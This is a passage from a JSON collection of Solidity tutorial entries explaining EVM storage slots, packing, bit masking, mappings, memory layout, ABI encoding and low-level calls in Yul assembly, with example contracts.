2 | arr[1].x\n            //     1 | slot s0 + 3 | arr[1].z | arr[1].y\n            //     2 | slot s0 + 4 | arr[2].x\n            //     2 | slot s0 + 5 | arr[2].z | arr[2].y\n            x := sload(add(start, mul(i, 2)))\n            let zy := sload(add(start, add(mul(i, 2), 1)))\n            // uint128 cuts off left most 128 bits from 32 bytes\n            y := zy\n            z := shr(128, zy)\n        }\n    }\n}\n\n```",
    "codes": [
      {
        "fileName": "EVMStorage.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\n// Yul - language used for Solidity inline assembly\ncontract YulIntro {\n    // Yul assignment\n    function test_yul_var() public pure returns (uint256) {\n        uint256 s = 0;\n\n        assembly {\n            // Declare variable\n            let x := 1\n            // Reassign\n            x := 2\n            // Assign to Solidity variable\n            s := 2\n        }\n\n        return s;\n    }\n\n    // Yul types (everything is bytes32)\n    function test_yul_types()\n        public\n        pure\n        returns (bool x, uint256 y, bytes32 z)\n    {\n        assembly {\n            x := 1\n            y := 0xaaa\n            z := \"Hello Yul\"\n        }\n\n        return (x, y, z);\n    }\n}\n\ncontract EVMStorageSingleSlot {\n    // EVM storage\n    // 2**256 slots, each slot can store up to 32 bytes\n    // Slots are assigned in the order the state variables are declared\n    // Data < 32 bytes are packed into a slot (right to left)\n    // sstore(k, v) = store v to slot k\n    // sload(k) = load 32 bytes from slot k\n\n    // Single variable stored in one slot\n    // slot 0\n    uint256 public s_x;\n    // slot 1\n    uint256 public s_y;\n    // slot 2\n    bytes32 public s_z;\n\n    function test_sstore() public {\n        assembly {\n            sstore(0, 111)\n            sstore(1, 222)\n            sstore(2, 0xababab)\n        }\n    }\n\n    function test_sstore_again() public {\n        // Access slot using .slot\n        assembly {\n            sstore(s_x.slot, 123)\n            sstore(s_y.slot, 456)\n            sstore(s_z.slot, 0xcdcdcd)\n        }\n    }\n\n    function test_sload()\n        public\n        view\n        returns (uint256 x, uint256 y, bytes32 z)\n    {\n        assembly {\n            x := sload(0)\n            y := sload(1)\n            z := sload(2)\n        }\n\n        return (x, y, z);\n    }\n\n    function test_sload_again()\n        public\n        view\n        returns (uint256 x, uint256 y, bytes32 z)\n    {\n        assembly {\n            x := sload(s_x.slot)\n            y := sload(s_y.slot)\n            z := sload(s_z.slot)\n        }\n\n        return (x, y, z);\n    }\n}\n\ncontract EVMStoragePackedSlotBytes {\n    // slot 0 (packed right to left)\n    bytes4 public b4 = 0xabababab;\n    bytes2 public b2 = 0xcdcd;\n\n    function get() public view returns (bytes32 b32) {\n        assembly {\n            b32 := sload(0)\n        }\n    }\n}\n\ncontract BitMasking {\n    function test_mask() public pure returns (bytes32 mask) {\n        assembly {\n            // |       256 bits        |\n            // 000 ... 000 | 111 ... 111\n            //             | 16 bits\n            // 0x000000000000000000000000000000000000000000000000000000000000ffff\n            mask := sub(shl(16, 1), 1)\n        }\n    }\n\n    function test_shift_mask() public pure returns (bytes32 mask) {\n        assembly {\n            // |               256 bits                |\n            // 000 ... 000 | 111 ... 111 | 000 ... 000 |\n            //             | 16 bits     | 32 bits\n            // 0x0000000000000000000000000000000000000000000000000000ffff00000000\n            mask := shl(32, sub(shl(16, 1), 1))\n        }\n    }\n\n    function test_not_mask() public pure returns (bytes32 mask) {\n        assembly {\n            // |               256 bits                |\n            // 111 ... 111 | 000 ... 000 | 111 ... 111 |\n            //             | 16 bits     | 32 bits\n            // 0xffffffffffffffffffffffffffffffffffffffffffffffffffff0000ffffffff\n            mask := not(shl(32, sub(shl(16, 1), 1)))\n        }\n    }\n}\n\ncontract EVMStoragePackedSlot {\n    // Data < 32 bytes are packed into a slot\n    // Bit masking (how to create 111...111)\n    // slot, offset\n\n    // slot 0\n    uint128 public s_a;\n    uint64 public s_b;\n    uint32 public s_c;\n    uint32 public s_d;\n    // slot 1\n    // 20 bytes = 160 bits\n    address public s_addr;\n    // 96 bits\n    uint64 public s_x;\n    uint32 public s_y;\n\n    function test_sstore() public {\n        assembly {\n            // Load 32 bytes from slot0\n            let v := sload(0)\n\n            // s_d | s_c | s_b | s_a\n            // 32  | 32  | 64  | 128 bits\n\n            // Set s_a = 11\n            // mask = all 1s at and to the left of 128 bit counting from right\n            //        111 ... 111 | 000 ... 000\n            //                    |    128 bits\n            let mask_a := not(sub(shl(128, 1), 1))\n            // Set left most 128 bits to 0\n            v := and(v, mask_a)\n            // Set s_a = 11\n            v := or(v, 11)\n\n            // Set s_b = 22\n            // mask = 111...111 | 000 ... 000 | 111 ... 111\n            //                  |     64 bits |    128 bits\n            let mask_b := not(shl(128, sub(shl(64, 1), 1)))\n            // Clear previous value of s_b by setting bits (128 to 191 bits) to 0\n            v := and(v, mask_b)\n            v := or(v, shl(128, 22))\n\n            // Set s_c = 33\n            // mask = 111...111 | 000...000 | 111 ... 111 | 111 ... 111\n            //                  |   32 bits |     64 bits |    128 bits\n            let mask_c := not(shl(192, sub(shl(32, 1), 1)))\n            // Clear previous value of s_c by setting bits (192 to 223 bits) to 0\n            v := and(v, mask_c)\n            v := or(v, shl(192, 33))\n\n            // Set s_d = 44\n            // mask = 000...000 | 111...111 | 111 ... 111 | 111 ... 111\n            //                  |   32 bits |     64 bits |    128 bits\n            let mask_d := not(shl(224, sub(shl(32, 1), 1)))\n            // Clear previous value of s_d by setting bits (224 to 255 bits) to 0\n            v := and(v, mask_d)\n            v := or(v, shl(224, 44))\n\n            // Store new value to slot0\n            sstore(0, v)\n        }\n    }\n\n    function test_slot_0_offset()\n        public\n        pure\n        returns (\n            uint256 a_offset,\n            uint256 b_offset,\n            uint256 c_offset,\n            uint256 d_offset\n        )\n    {\n        // a_offset =  0 =  0 * 8 =   0 bits\n        // b_offset = 16 = 16 * 8 = 128 bits\n        // c_offset = 24 = 24 * 8 = 192 bits\n        // d_offset = 28 = 28 * 8 = 224 bits\n        assembly {\n            a_offset := s_a.offset\n            b_offset := s_b.offset\n            c_offset := s_c.offset\n            d_offset := s_d.offset\n        }\n    }\n\n    function test_slot_1_offset()\n        public\n        pure\n        returns (uint256 addr_offset, uint256 x_offset, uint256 y_offset)\n    {\n        // addr_offset = 0\n        // x_offset = 20\n        // y_offset = 28\n        assembly {\n            addr_offset := s_addr.offset\n            x_offset := s_x.offset\n            y_offset := s_y.offset\n        }\n    }\n\n    // slot and offset\n    function test_sstore_using_offset() public {\n        // a_offset =  0 =  0 * 8 =   0 bits\n        // b_offset = 16 = 16 * 8 = 128 bits\n        // c_offset = 24 = 24 * 8 = 192 bits\n        // d_offset = 28 = 28 * 8 = 224 bits\n        assembly {\n            // Load 32 bytes from slot0\n            let v := sload(s_a.slot)\n\n            // s_d | s_c | s_b | s_a\n            // 32  | 32  | 64  | 128 bits\n\n            // Set s_a = 111\n            // mask = all 1s at and to the left of 128 bit counting from right\n            //        111 ... 111 | 000 ... 000\n            //                    |    128 bits\n            let mask_a := not(sub(shl(128, 1), 1))\n            // Set left most 128 bits to 0\n            v := and(v, mask_a)\n            // Set s_a = 1\n            v := or(v, 111)\n\n            // Set s_b = 222\n            // mask = 111...111 | 000 ... 000 | 111 ... 111\n            //                  |     64 bits |    128 bits\n            let mask_b := not(shl(mul(s_b.offset, 8), sub(shl(64, 1), 1)))\n            // Clear previous value of s_b by setting bits (128 to 191 bits) to 0\n            v := and(v, mask_b)\n            v := or(v, shl(mul(s_b.offset, 8), 222))\n\n            // Set s_c = 333\n            // mask = 111...111 | 000...000 | 111 ... 111 | 111 ... 111\n            //                  |   32 bits |     64 bits |    128 bits\n            let mask_c := not(shl(mul(s_c.offset, 8), sub(shl(32, 1), 1)))\n            // Clear previous value of s_c by setting bits (192 to 223 bits) to 0\n            v := and(v, mask_c)\n            v := or(v, shl(mul(s_c.offset, 8), 333))\n\n            // Set s_d = 444\n            // mask = 000...000 | 111...111 | 111 ... 111 | 111 ... 111\n            //                  |   32 bits |     64 bits |    128 bits\n            let mask_d := not(shl(mul(s_d.offset, 8), sub(shl(32, 1), 1)))\n            // Clear previous value of s_d by setting bits (224 to 255 bits) to 0\n            v := and(v, mask_d)\n            v := or(v, shl(mul(s_d.offset, 8), 444))\n\n            // Store new value to slot0\n            sstore(s_a.slot, v)\n        }\n    }\n}\n\ncontract EVMStorageStruct {\n    struct SingleSlot {\n        uint128 x;\n        uint64 y;\n        uint64 z;\n    }\n\n    struct MultipleSlots {\n        uint256 a;\n        uint256 b;\n        uint256 c;\n    }\n\n    // slot 0\n    SingleSlot public single = SingleSlot({x: 1, y: 2, z: 3});\n    // slot 1, 2, 3\n    MultipleSlots public multi = MultipleSlots({a: 11, b: 22, c: 33});\n\n    function test_get_single_slot_struct()\n        public\n        view\n        returns (uint128 x, uint64 y, uint64 z)\n    {\n        assembly {\n            let s := sload(0)\n            //  z |  y | x\n            // 64 | 64 | 128 bits\n            // Casting cuts off bits to the left\n            x := s\n            y := shr(128, s)\n            z := shr(192, s)\n        }\n    }\n\n    function test_get_multiple_slots_struct()\n        public\n        view\n        returns (uint256 a, uint256 b, uint256 c)\n    {\n        assembly {\n            a := sload(1)\n            b := sload(2)\n            c := sload(3)\n        }\n    }\n}\n\ncontract EVMStorageConstants {\n    // slot 0\n    uint256 public s0 = 1;\n    // Constants and immutables don't use storage\n    uint256 public constant X = 123;\n    address public immutable owner;\n    // slot 1\n    uint256 public s1 = 2;\n\n    constructor() {\n        owner = msg.sender;\n    }\n\n    function test_get_slots() public view returns (uint256 v0, uint256 v1) {\n        assembly {\n            v0 := sload(0)\n            v1 := sload(1)\n        }\n    }\n}\n\ncontract EVMStorageFixedArray {\n    // Fixed array with elements = 32 bytes, slot of element = slot where array is declared + index of array element\n    // slots 0, 1, 2\n    uint256[3] private arr_0 = [1, 2, 3];\n    // slots 3, 4, 5\n    uint256[3] private arr_1 = [4, 5, 6];\n    // slot + index of packed data\n    // slots 6, 6, 7, 7, 8\n    uint128[5] private arr_2 = [7, 8, 9, 10, 11];\n\n    function test_arr_0(uint256 i) public view returns (uint256 v) {\n        assembly {\n            // arr_0 starts from slot 0\n            v := sload(add(0, i))\n        }\n    }\n\n    function test_arr_1(uint256 i) public view returns (uint256 v) {\n        assembly {\n            // arr_1 starts from slot 3\n            v := sload(add(3, i))\n        }\n    }\n\n    function test_arr_2(uint256 i) public view returns (uint128 v) {\n        assembly {\n            // arr_2 starts from slot 6\n            let b32 := sload(add(6, div(i, 2)))\n            // slot 6 = 1st element | 0th element\n            // slot 7 = 3rd element | 2nd element\n            // slot 8 = 000 ... 000 | 4th element\n\n            // i is even => get right 128 bits => cast bytes32 to uint128 (cut off left 128 bits)\n            // i is odd  => get left 128 bits  => shift right 128 bits\n\n            switch mod(i, 2)\n            case 1 { v := shr(128, b32) }\n            default { v := b32 }\n        }\n    }\n}\n\ncontract EVMStorageDynamicArray {\n    // slot of element = keccak256(slot where this array is declared) + size of element * index of element\n    // keccak256(0) + 1 * index\n    uint256[] private arr = [11, 22, 33];\n    // keccak256(1) + 1 / 2 * index\n    uint128[] private arr_2 = [1, 2, 3];\n\n    function test_arr(uint256 slot, uint256 i)\n        public\n        view\n        returns (uint256 v, bytes32 b32, uint256 len)\n    {\n        bytes32 start = keccak256(abi.encode(slot));\n\n        assembly {\n            len := sload(slot)\n            v := sload(add(start, i))\n            b32 := v\n        }\n    }\n}\n\ncontract EVMStorageMapping {\n    // slot of value = keccak256(key, slot where mapping is declared)\n    mapping(address => uint256) public map;\n\n    address public constant ADDR_1 = address(1);\n    address public constant ADDR_2 = address(2);\n    address public constant ADDR_3 = address(3);\n\n    constructor() {\n        map[ADDR_1] = 11;\n        map[ADDR_2] = 22;\n        map[ADDR_3] = 33;\n    }\n\n    function test_mapping(address key) public view returns (uint256 v) {\n        uint256 slot = 0;\n        bytes32 slot_v = keccak256(abi.encode(key, slot));\n\n        assembly {\n            v := sload(slot_v)\n        }\n    }\n}\n\ncontract EVMStorageNestedMapping {\n    // key0 => key1 => val\n    // slot of value = keccak256(key1, keccak256(key0, slot where nested mapping is declared))\n    mapping(address => mapping(address => uint256)) public map;\n\n    address public constant ADDR_1 = address(1);\n    address public constant ADDR_2 = address(2);\n    address public constant ADDR_3 = address(3);\n\n    constructor() {\n        map[ADDR_1][ADDR_2] = 11;\n        map[ADDR_2][ADDR_3] = 22;\n        map[ADDR_3][ADDR_1] = 33;\n    }\n\n    function test_nested_mapping(address key_0, address key_1)\n        public\n        view\n        returns (uint256 v)\n    {\n        uint256 slot = 0;\n        bytes32 s0 = keccak256(abi.encode(key_0, slot));\n        bytes32 s1 = keccak256(abi.encode(key_1, s0));\n\n        assembly {\n            v := sload(s1)\n        }\n    }\n}\n\ncontract EVMStorageMappingArray {\n    // slot of value in a mapping = keccak256(key, slot)\n    // slot of array element = keccak256(slot) + index\n    // mapping -> array -> keccak256(keccak256(key, slot of map declaration)) + index\n    mapping(address => uint256[]) public map;\n\n    address public constant ADDR_1 = address(1);\n    address public constant ADDR_2 = address(2);\n\n    constructor() {\n        map[ADDR_1].push(11);\n        map[ADDR_1].push(22);\n        map[ADDR_1].push(33);\n        map[ADDR_2].push(44);\n        map[ADDR_2].push(55);\n        map[ADDR_2].push(66);\n    }\n\n    function test_map_arr(address addr, uint256 i)\n        public\n        view\n        returns (uint256 v, uint256 len)\n    {\n        uint256 map_slot = 0;\n        bytes32 map_hash = keccak256(abi.encode(addr, map_slot));\n        bytes32 arr_hash = keccak256(abi.encode(map_hash));\n\n        assembly {\n            len := sload(map_hash)\n            v := sload(add(arr_hash, i))\n        }\n    }\n}\n\ncontract EVMStorageDynamicArrayStruct {\n    struct Point {\n        uint256 x;\n        uint128 y;\n        uint128 z;\n    }\n\n    // slot of element = keccak256(slot where this array is declared) + index of element\n    // keccak256(0) + index * size of struct\n    Point[] private arr;\n\n    constructor() {\n        arr.push(Point(11, 22, 33));\n        arr.push(Point(44, 55, 66));\n        arr.push(Point(77, 88, 99));\n    }\n\n    function test_struct_arr(uint256 i)\n        public\n        view\n        returns (uint256 x, uint128 y, uint128 z, uint256 len)\n    {\n        uint256 slot = 0;\n        bytes32 start = keccak256(abi.encode(slot));\n\n        assembly {\n            len := sload(slot)\n            // s0 = keccak256(0)\n            // index | slot        | values\n            //     0 | slot s0 + 0 | arr[0].x\n            //     0 | slot s0 + 1 | arr[0].z | arr[0].y\n            //     1 | slot s0 + 2 | arr[1].x\n            //     1 | slot s0 + 3 | arr[1].z | arr[1].y\n            //     2 | slot s0 + 4 | arr[2].x\n            //     2 | slot s0 + 5 | arr[2].z | arr[2].y\n            x := sload(add(start, mul(i, 2)))\n            let zy := sload(add(start, add(mul(i, 2), 1)))\n            // uint128 cuts off left most 128 bits from 32 bytes\n            y := zy\n            z := shr(128, zy)\n        }\n    }\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "data",
      "evm",
      "storage",
      "state",
      "variable",
      "yul",
      "assembly"
    ],
    "order": 0
  },
  {
    "slug": "memory",
    "title": "EVM Memory Layout in Solidity",
    "category": "EVM",
    "categorySlug": "evm",
    "description": "Example of EVM memory in Solidity",
    "content": "Examples of\n\n- Reading and writing to memory with `assembly`\n- Memory layout in Solidity of different data types\n- Memory management for external calls\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.26;\n\n// Memory layout\n// array of length 2**256 (32 bytes), each element stores 1 byte (0x00 to 0xff)\n// index     0    1    2   ...   0xfff...fff = 2**256 - 1\n// memory | 00 | 00 | 00 | ... | 00 |\n\n// Reserved slots\n// 0x00 - 0x3f (64 bytes): scratch space for hashing methods\n// 0x40 - 0x5f (32 bytes): free memory pointer - pointer to next available location in memory to store data\n// 0x60 - 0x7f (32 bytes): zero slot - used as initial value for dynamic memory arrays and should never be written to\n\n// Free memory pointer (0x40)\n// 0x80 = Free memory pointer initially points here\ncontract MemBasic {\n    // mstore(p, v) = store 32 bytes to memory starting at memory location p\n    // mload(p) = load 32 bytes from memory starting at memory location p\n    function test_1() public pure returns (bytes32 b32) {\n        assembly {\n            // Free memory pointer\n            // p = 0x80\n            let p := mload(0x40)\n            mstore(p, 0xababab)\n            b32 := mload(p)\n        }\n    }\n\n    function test_2() public pure {\n        assembly {\n            mstore(0, 0x11)\n            // index: 32 bytes of data stored in memory from index\n            //  0x00: 0x0000000000000000000000000000000000000000000000000000000000000011\n            mstore(1, 0x22)\n            //           0 1\n            //  0x00: 0x0000000000000000000000000000000000000000000000000000000000000000\n            //  0x20: 0x2200000000000000000000000000000000000000000000000000000000000000\n            mstore(2, 0x33)\n            //           0 1 2\n            //  0x00: 0x0000000000000000000000000000000000000000000000000000000000000000\n            //  0x20: 0x0033000000000000000000000000000000000000000000000000000000000000\n            mstore(3, 0x44)\n            //           0 1 2 3\n            //  0x00: 0x0000000000000000000000000000000000000000000000000000000000000000\n            //  0x20: 0x0000440000000000000000000000000000000000000000000000000000000000\n        }\n    }\n}\n\ncontract MemStruct {\n    // Memory data is not packed - all data stored in chunks of 32 bytes\n    struct Point {\n        uint256 x;\n        uint32 y;\n        uint32 z;\n    }\n\n    function test_read()\n        public\n        pure\n        returns (uint256 x, uint256 y, uint256 z)\n    {\n        // Point is loaded to memory starting at 0x80\n        // 0x80 = initial free memory\n        Point memory p = Point(1, 2, 3);\n\n        assembly {\n            // load 32 bytes starting from 0x80\n            x := mload(0x80)\n            // load 32 bytes starting from 0xa0 (0x80 + 32 = 0xa0)\n            y := mload(0xa0)\n            // load 32 bytes starting from 0xc0 (0xa0 + 32 = 0xc0)\n            z := mload(0xc0)\n        }\n    }\n\n    function test_write()\n        public\n        pure\n        returns (bytes32 free_mem_ptr, uint256 x, uint256 y, uint256 z)\n    {\n        // Allocates memory 0x80 to 0xdf to Point\n        // Free memory pointer = 0xdf + 1 = 0xe0\n        Point memory p;\n\n        // Write\n        assembly {\n            // store to 0x80\n            mstore(p, 11)\n            // store to 0xa0\n            mstore(add(p, 0x20), 22)\n            // store to 0xc0\n            mstore(add(p, 0x40), 33)\n            // 0xe0\n            free_mem_ptr := mload(0x40)\n        }\n\n        x = p.x;\n        y = p.y;\n        z = p.z;\n    }\n}\n\ncontract MemFixedArray {\n    function test_read()\n        public\n        pure\n        returns (uint256 a0, uint256 a1, uint256 a2)\n    {\n        // arr is loaded to memory starting at 0x80\n        // Each array element is stored as 32 bytes\n        uint32[3] memory arr = [uint32(1), uint32(2), uint32(3)];\n\n        assembly {\n            a0 := mload(0x80)\n            a1 := mload(0xa0)\n            a2 := mload(0xc0)\n        }\n    }\n\n    function test_write()\n        public\n        pure\n        returns (uint256 a0, uint256 a1, uint256 a2)\n    {\n        uint32[3] memory arr;\n\n        assembly {\n            // 0x80\n            mstore(arr, 11)\n            // 0xa0\n            mstore(add(arr, 0x20), 22)\n            // 0xc0\n            mstore(add(arr, 0x40), 33)\n        }\n\n        a0 = arr[0];\n        a1 = arr[1];\n        a2 = arr[2];\n    }\n}\n\ncontract MemDynamicArray {\n    function test_read()\n        public\n        pure\n        returns (bytes32 p, uint256 len, uint256 a0, uint256 a1, uint256 a2)\n    {\n        uint256[] memory arr = new uint256[](5);\n        arr[0] = uint256(11);\n        arr[1] = uint256(22);\n        arr[2] = uint256(33);\n        arr[3] = uint256(44);\n        arr[4] = uint256(55);\n\n        assembly {\n            p := arr\n            // 0x80\n            len := mload(arr)\n            // 0xa0\n            a0 := mload(add(arr, 0x20))\n            // 0xc0\n            a1 := mload(add(arr, 0x40))\n            // 0xe0\n            a2 := mload(add(arr, 0x60))\n        }\n    }\n\n    function test_write() public pure returns (bytes32 p, uint256[] memory) {\n        uint256[] memory arr = new uint256[](0);\n\n        assembly {\n            p := arr\n            // Store length of arr\n            mstore(arr, 3)\n            // Store 1, 2, 3\n            mstore(add(arr, 0x20), 11)\n            mstore(add(arr, 0x40), 22)\n            mstore(add(arr, 0x60), 33)\n            // Update free memory pointer\n            mstore(0x40, add(arr, 0x80))\n        }\n\n        // Data will be ABI encoded when arr is returned to caller\n        return (p, arr);\n    }\n}\n\ncontract MemInternalFuncReturn {\n    function internal_func_return_val() private pure returns (uint256) {\n        return uint256(0xababab);\n    }\n\n    function test_val() public pure {\n        // 0xababab will be stored in top of the stack\n        internal_func_return_val();\n    }\n\n    function internal_func_return_mem()\n        private\n        pure\n        returns (bytes32[] memory)\n    {\n        bytes32[] memory arr = new bytes32[](3);\n        arr[0] = bytes32(uint256(0xaaa));\n        arr[1] = bytes32(uint256(0xbbb));\n        arr[2] = bytes32(uint256(0xccc));\n        return arr;\n    }\n\n    function test_mem()\n        public\n        pure\n        returns (uint256 len, bytes32 a0, bytes32 a1, bytes32 a2)\n    {\n        // Stores 0x80 to top of the stack\n        // 0x80 = memory pointer to beginning of arr\n        internal_func_return_mem();\n        // Read data from arr, initialized in internal_func_return_mem, using assembly\n        assembly {\n            len := mload(0x80)\n            a0 := mload(0xa0)\n            a1 := mload(0xc0)\n            a2 := mload(0xe0)\n        }\n    }\n}\n\ncontract ABIEncode {\n    // js code to split string into chunks of length 64\n    // str.match(/.{1,64}/g)\n\n    // Value types < 32 bytes -> zero padded on the left side\n    // 0x000000000000000000000000abababababababababababababababababababab\n    function encode_addr() public pure returns (bytes memory) {\n        address addr = 0xABaBaBaBABabABabAbAbABAbABabababaBaBABaB;\n        return abi.encode(addr);\n    }\n\n    // Fixed sized bytes -> zero padded on the right side\n    // 0xaabbccdd00000000000000000000000000000000000000000000000000000000\n    function encode_bytes4() public pure returns (bytes memory) {\n        bytes4 b4 = 0xaabbccdd;\n        return abi.encode(b4);\n    }\n\n    // Dynamic size types\n    // offset | length | data\n    // offset = 32 bytes index where data starts\n    // length = 32 bytes data length\n\n    // 0x0000000000000000000000000000000000000000000000000000000000000020\n    //   0000000000000000000000000000000000000000000000000000000000000003\n    //   ababab0000000000000000000000000000000000000000000000000000000000\n    function encode_bytes() public pure returns (bytes memory) {\n        bytes memory b = new bytes(3);\n        b[0] = 0xab;\n        b[1] = 0xab;\n        b[2] = 0xab;\n        return abi.encode(b);\n    }\n\n    // 0x0000000000000000000000000000000000000000000000000000000000000020\n    //   0000000000000000000000000000000000000000000000000000000000000003\n    //   0000000000000000000000000000000000000000000000000000000000000001\n    //   0000000000000000000000000000000000000000000000000000000000000002\n    //   0000000000000000000000000000000000000000000000000000000000000003\n    function encode_uint8_arr() public pure returns (bytes memory) {\n        uint8[] memory a = new uint8[](3);\n        a[0] = 1;\n        a[1] = 2;\n        a[2] = 3;\n        return abi.encode(a);\n    }\n\n    // Fixed size arrays\n    // 0x0000000000000000000000000000000000000000000000000000000000000001\n    //   0000000000000000000000000000000000000000000000000000000000000002\n    //   0000000000000000000000000000000000000000000000000000000000000003\n    function encode_uint256_fixed_size_arr()\n        public\n        pure\n        returns (bytes memory)\n    {\n        uint8[3] memory a;\n        a[0] = 1;\n        a[1] = 2;\n        a[2] = 3;\n        return abi.encode(a);\n    }\n\n    // Struct\n    struct Point {\n        uint256 x;\n        uint128 y;\n        uint128 z;\n    }\n\n    // 0x0000000000000000000000000000000000000000000000000000000000000001\n    //   0000000000000000000000000000000000000000000000000000000000000002\n    //   0000000000000000000000000000000000000000000000000000000000000003\n    function encode_struct() public pure returns (bytes memory) {\n        Point memory p = Point(1, 2, 3);\n        return abi.encode(p);\n    }\n\n    // Dynamic sized array of structs\n    // offset | length | struct data\n    // 0x0000000000000000000000000000000000000000000000000000000000000020\n    //   0000000000000000000000000000000000000000000000000000000000000003\n    //   0000000000000000000000000000000000000000000000000000000000000001\n    //   0000000000000000000000000000000000000000000000000000000000000002\n    //   0000000000000000000000000000000000000000000000000000000000000003\n    //   0000000000000000000000000000000000000000000000000000000000000004\n    //   0000000000000000000000000000000000000000000000000000000000000005\n    //   0000000000000000000000000000000000000000000000000000000000000006\n    //   0000000000000000000000000000000000000000000000000000000000000007\n    //   0000000000000000000000000000000000000000000000000000000000000008\n    //   0000000000000000000000000000000000000000000000000000000000000009\n    function encode_struct_array() public pure returns (bytes memory) {\n        Point[] memory arr = new Point[](3);\n        arr[0] = Point(1, 2, 3);\n        arr[1] = Point(4, 5, 6);\n        arr[2] = Point(7, 8, 9);\n        return abi.encode(arr);\n    }\n}\n\ncontract MemReturn {\n    function test_return_vals() public pure returns (uint256, uint256) {\n        // return(start, len) - Halt execution and return data stored in memory from start to start + len\n        assembly {\n            mstore(0x80, 11)\n            mstore(0xa0, 22)\n            return(0x80, 0x40)\n        }\n    }\n\n    function test_return_dyn_arr() public pure returns (uint256[] memory) {\n        // ABI encode uint256[] array with 3 elements 11, 22 and 33\n        assembly {\n            // offset\n            mstore(0x80, 0x20)\n            // length\n            mstore(add(0x80, 0x20), 3)\n            // array elements\n            mstore(add(0x80, 0x40), 11)\n            mstore(add(0x80, 0x60), 22)\n            mstore(add(0x80, 0x80), 33)\n            // No need to update free memory pointer - function execution ends here\n            return(0x80, mul(5, 0x20))\n        }\n    }\n\n    function test_return() public pure returns (uint256, uint256) {\n        // Returns (11, 22)\n        test_return_vals();\n        // This code will never execute\n        return (333, 444);\n    }\n}\n\ncontract MemRevert {\n    function test_revert() public pure {\n        // revert(start, len) - Revert execution and return data store in memory from start to start + len\n        assembly {\n            mstore(0x80, \"ERROR HERE\")\n            revert(0x80, 0x20)\n        }\n    }\n\n    function test_revert_with_error_msg() public pure {\n        assembly {\n            let p := mload(0x40)\n            // function selector of Error(string)\n            // 0x08c379a000000000000000000000000000000000000000000000000000000000\n            // 0x08c379a0 is 32 bits, shift left by 224 to make it 256 bits\n            // 255 - 31 = 224\n            mstore(p, shl(224, 0x08c379a0))\n            // String offset\n            mstore(add(p, 0x04), 0x20)\n            // String length\n            mstore(add(p, 0x24), 5)\n            // Message (must be less than 32 bytes)\n            mstore(add(p, 0x44), \"ERROR\")\n            // function selector + offset + string length + string message\n            // = 0x04 + 0x20 + 0x20 + 0x20\n            // = 0x64\n            revert(p, 0x64)\n        }\n    }\n}\n\ncontract MemKeccak {\n    function test_keccak() public pure returns (bytes32) {\n        // keccak256(start, len) - Keccak256 from data in memory from start to start + len\n        assembly {\n            mstore(0x80, 1)\n            mstore(0xa0, 2)\n\n            let h := keccak256(0x80, 0x40)\n            mstore(0xc0, h)\n\n            return(0xc0, 0x20)\n        }\n    }\n\n    function keccak() public pure returns (bytes32) {\n        return keccak256(abi.encodePacked(uint256(1), uint256(2)));\n    }\n}\n\ncontract Target {\n    function return_uint256(uint256 x) public pure returns (uint256) {\n        return x;\n    }\n\n    function return_bytes(uint256 n) public pure returns (bytes memory) {\n        bytes memory out = new bytes(n);\n        for (uint256 i; i < n; i++) {\n            out[i] = 0xab;\n        }\n        return out;\n    }\n\n    function return_uint256_arr(uint256 n)\n        public\n        pure\n        returns (uint256[] memory)\n    {\n        uint256[] memory out = new uint256[](n);\n        for (uint256 i = 0; i < n; i++) {\n            out[i] = i + 1;\n        }\n        return out;\n    }\n}\n\n// calldatacopy(p, start, size) - Copy start to start + size calldata to memory starting at pointer p\n// returndatasize - Get size of returned data from call, staticcall or delegatecall\n// returndatacopy(p, start, size) - Copy start to start + size return data to memory starting at pointer p\n// call(g, a, v, in, in_size, out, out_size)\n// - call contract at a, use max g gas, send v wei\n// - with input from memory in to in + in_size\n// - use memory out to out + out_size for output\n// staticcall(g, a, in, in_size, out, out_size) - read only version of call\ncontract YulStaticCall {\n    function test_staticcall(address a, bytes calldata data) public view {\n        assembly {\n            let p := mload(0x40)\n            // Copy calldata to memory\n            calldatacopy(p, data.offset, data.length)\n\n            let ok := staticcall(gas(), a, p, data.length, 0, 0)\n\n            if iszero(ok) { revert(0, 0) }\n\n            // p := mload(0x40)\n            let return_data_size := returndatasize()\n            // Copy returned data to memory\n            // Is it safe to overwrite memory that was used for inputs?\n            returndatacopy(p, 0, return_data_size)\n            return(p, return_data_size)\n        }\n    }\n\n    function test_abi_decode_uint256(address a, bytes calldata data)\n        public\n        view\n        returns (uint256)\n    {\n        test_staticcall(a, data);\n    }\n\n    function test_abi_decode_bytes(address a, bytes calldata data)\n        public\n        view\n        returns (bytes memory)\n    {\n        test_staticcall(a, data);\n    }\n\n    function test_abi_decode_uint256_arr(address a, bytes calldata data)\n        public\n        view\n        returns (uint256[] memory)\n    {\n        test_staticcall(a, data);\n    }\n\n    function test_staticcall_return_abi_encoded_bytes(\n        address addr,\n        bytes calldata data\n    ) public view returns (bytes memory out, uint256 return_data_size) {\n        assembly {\n            let p := mload(0x40)\n            // Copy calldata to memory\n            calldatacopy(p, data.offset, data.length)\n            // Update free memory pointer\n            mstore(0x40, add(p, data.length))\n\n            let ok := staticcall(gas(), addr, p, data.length, 0, 0)\n\n            if iszero(ok) { revert(0, 0) }\n\n            // return_data_size = 32  for calling Target.return_uint256 -> uint256\n            //                  = 96  for calling Target.return_bytes -> bytes[] (32 offset, 32 length, 3 bytes padded to 32)\n            //                  = 160 for calling Target.return_uint256_arr -> uint256[] (32 offset, 32 length, 32 x 3 elements)\n            return_data_size := returndatasize()\n            // Store length of return data to out\n            // pointer to out = 0x60 (zero slot)\n            mstore(out, return_data_size)\n            // Copy return data to out\n            returndatacopy(add(out, 0x20), 0, return_data_size)\n            // Update free memory pointer\n            mstore(0x40, add(out, add(0x20, return_data_size)))\n        }\n    }\n}\n\ncontract Counter {\n    uint256 public count;\n\n    function inc() public returns (uint256) {\n        count += 1;\n        return count;\n    }\n}\n\ncontract YulCall {\n    function test_call(address a, bytes memory data)\n        public\n        payable\n        returns (bytes memory out)\n    {\n        assembly {\n            // 0x80\n            let data_ptr := data\n            // 0x60\n            let out_ptr := out\n\n            let data_size := mload(data)\n            let data_start := add(data, 0x20)\n            let ok := call(gas(), a, callvalue(), data_start, data_size, 0, 0)\n\n            if iszero(ok) { revert(0, 0) }\n\n            let return_data_size := returndatasize()\n            // Store length of return data to out\n            mstore(out, return_data_size)\n            // Copy return data to out\n            returndatacopy(add(out, 0x20), 0, 